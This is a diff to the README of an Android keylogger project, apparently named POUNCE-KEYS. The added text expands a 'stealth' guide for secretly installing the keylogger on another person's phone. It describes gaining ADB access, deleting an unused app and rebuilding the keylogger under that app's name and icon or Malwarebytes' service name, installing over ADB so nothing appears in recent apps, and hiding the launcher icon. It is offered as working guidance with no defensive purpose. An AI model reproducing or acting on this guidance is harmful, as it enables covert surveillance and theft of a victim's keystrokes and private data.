@@ -16,7 +16,7 @@
   <h3 align="center">POUNCE-KEYS</h3>
 
   <p align="center">
-    Custom Java listener [ Keylogger for Android ] 🐱‍⌨️
+    Custom Java listener [ Keylogger for Android ] 🐱‍⌨️ + advanced stealth guide
     <br />
     <a href="https://github.com/NullPounce/pounce-keys/releases">View Release</a>
     ·
@@ -48,7 +48,9 @@ sorry for the low quality, 10mb gif size limit
 
 
 
-# Update: changed my username
+# Update: changed my username and wont guide any more detailed custom stealth options (see recent update bellow in stealth section)
+as much as I love working on this project, I need to find the time to do so.
+
 TODO:
 add tab for reddit, twitter, firefox
 # Listener Features ![Linode](https://img.shields.io/badge/Supports-Linode-green)  ![Linode](https://img.shields.io/badge/Kali-Linux-blue)
@@ -98,9 +100,15 @@ sudo ufw allow 4444 "if on linode or on WAN" no need for open ports on android's
 
 
 
-# STEALTH
+# STEALTH 
+# I will make a full video showing how to build apk with any app name and icon then remotely install in place of old app) "if i get any support"
+this would allow you to (after adb into device) delete apk thats never used, then replace with your own custom app, you could
+delete a downloaded files app they dont use and build the keylogger to use the same name and icon, better yet i can show how to copy
+malwarebytes service name! you can easily just ctrl+F the code in AS and edit the names and see where the icon goes.
+
 TIP! install via ADB to avoid recent apps timestamp, also settings does not show in this list, also to assure hiden icon in some cases
 UPDATE: if all fails try long pressing the home screen to open launcher settings for a hide apps option.
+
 
 1. have a device with adb setup in a terminal and run adb tcpip 5555 with a phone charger plugged in (also have the stealth apk ready in same dir)
 2. make a new folder on the adb pc with this structure com.BatteryHealth/files/keys/fix.dat
